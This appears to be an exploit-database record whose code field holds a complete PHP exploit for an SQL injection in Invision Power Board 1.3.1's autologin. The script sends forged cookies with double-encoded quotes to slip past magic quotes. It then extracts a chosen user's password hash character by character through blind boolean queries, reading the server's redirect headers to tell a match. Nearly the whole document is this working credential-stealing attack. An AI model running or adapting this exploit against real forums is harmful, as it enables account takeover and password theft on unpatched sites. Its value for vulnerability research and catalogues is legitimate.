{
  "id": "1036",
  "title": "Invision Power Board 1.3.1 - &#039;login.php&#039; SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "<?php\r\n/* \r\n<= 1.3.1 Final\r\n/str0ke\r\n*/\r\n\r\n$server = \"SERVER\";\r\n$port = 80;\r\n$file = \"PATH\";\r\n\r\n$target = 81;\r\n\r\n/* User id and password used to fake-logon are not important. '10' is a\r\nrandom number. */\r\n$id = 10;\r\n$pass = \"\";\r\n\r\n$hex = \"0123456789abcdef\";\r\nfor($i = 1; $i <= 32; $i++ ) {\r\n        $idx = 0;\r\n        $found = false;\r\n\r\n        while( !($found) ) {\r\n                $letter = substr($hex, $idx, 1);\r\n\r\n                /* %2527 translates to %27, which gets past magic quotes.\r\nThis is translated to ' by urldecode. */\r\n                $cookie =\r\n\"member_id=$id;pass_hash=$pass%2527%20OR%20id=$target\";\r\n                $cookie .=\r\n\"%20HAVING%20id=$target%20AND%20MID(`password`,$i,1)=%2527\" . $letter;\r\n\r\n                /* Query is in effect: SELECT * FROM ibf_members\r\n                                       WHERE id=$id AND password='$pass' OR\r\nid=$target\r\n                                       HAVING id=$target AND\r\nMID(`password`,$i,1)='$letter' */\r\n\r\n                $header = getHeader($server, $port, $file .\r\n\"index.php?act=Login&CODE=autologin\", $cookie);\r\n                if( !preg_match('/Location:(.*)act\\=Login\\&CODE\\=00\\r\\n/',\r\n$header) ) {\r\n                        echo $i . \": \" . $letter . \"\\n\";\r\n                        $found = true;\r\n\r\n                        $hash .= $letter;\r\n                } else {\r\n                        $idx++;\r\n                }\r\n        }\r\n}\r\n\r\necho \"\\n\\nFinal Hash: $hash\\n\";\r\n\r\nfunction getHeader($server, $port, $file, $cookie) {\r\n        $ip = gethostbyname($server);\r\n        $fp = fsockopen($ip, $port);\r\n\r\n        if (!$fp) {\r\n                return \"Unknown\";\r\n        } else {\r\n                $com = \"HEAD $file HTTP/1.1\\r\\n\";\r\n                $com .= \"Host: $server:$port\\r\\n\";\r\n                $com .= \"Cookie: $cookie\\r\\n\";\r\n                $com .= \"Connection: close\\r\\n\";\r\n                $com .= \"\\r\\n\";\r\n\r\n                fputs($fp, $com);\r\n\r\n                do {\r\n                        $header.= fread($fp, 512);\r\n                } while( !preg_match('/\\r\\n\\r\\n$/',$header) );\r\n        }\r\n\r\n        return $header;\r\n}\r\n?>\r\n\r\n// milw0rm.com [2005-06-08]",
  "url": "https://www.exploit-db.com/exploits/1036"
}